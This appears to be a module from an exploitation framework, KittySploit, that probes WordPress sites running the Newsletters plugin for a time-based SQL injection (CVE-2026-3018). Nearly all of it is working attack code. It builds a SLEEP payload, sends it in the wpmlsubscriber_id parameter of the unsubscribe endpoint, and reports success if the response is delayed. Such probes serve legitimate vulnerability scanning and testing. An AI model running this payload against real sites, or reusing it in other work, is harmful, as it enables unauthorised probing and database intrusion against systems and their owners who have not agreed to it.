#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Newsletters CVE-2026-3018 — wpmlsubscriber_id time-based SQLi probe."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Newsletters CVE-2026-3018 SQLi probe",
        "description": "Runs SLEEP in wpmlsubscriber_id on unsubscribe endpoint.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-3018"],
        "tags": ["wordpress", "newsletters", "sqli", "cve-2026-3018"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    sleep_seconds = OptInteger(8, "SLEEP seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        sleep_s = int(self.sleep_seconds or 8)
        inj = f"1'+AND+(SELECT+1+FROM+(SELECT(SLEEP({sleep_s})))x)+AND+'1'='1"
        start = time.monotonic()
        self.http_request(
            method="GET",
            path=self._join("/newsletter-management/"),
            params={
                "method": "unsubscribe",
                "wpmlsubscriber_id": inj,
                "authkey": "x",
                "wpmlmailinglist_id": "1",
            },
            allow_redirects=True,
            timeout=30,
        )
        elapsed = time.monotonic() - start
        if elapsed >= sleep_s - 1:
            print_success(f"Delayed ~{elapsed:.1f}s")
            return True
        print_error(f"No delay ({elapsed:.1f}s)")
        return False
